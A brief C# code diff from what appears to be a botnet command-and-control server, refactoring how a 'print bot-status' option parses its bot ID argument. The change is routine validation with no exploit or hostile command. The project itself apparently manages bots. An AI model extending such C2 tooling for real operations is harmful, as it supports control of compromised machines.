@@ -57,9 +57,10 @@ namespace CnC_Server.Options
             Console.WriteLine("This option will print all the information from the specific bot saved locally on the server. FORMAT: print bot-status <bot id>");
         }
 
-        public bool ParseArguments(string arguments)
+        public bool ParseArguments(string[] arguments)
         {
-            if (int.TryParse(arguments, out int botID) && botID > 0)
+            if (arguments.Length == 1
+                && int.TryParse(arguments[0], out int botID) && botID > 0)
             {
                 SetBotID(botID);
                 return true;
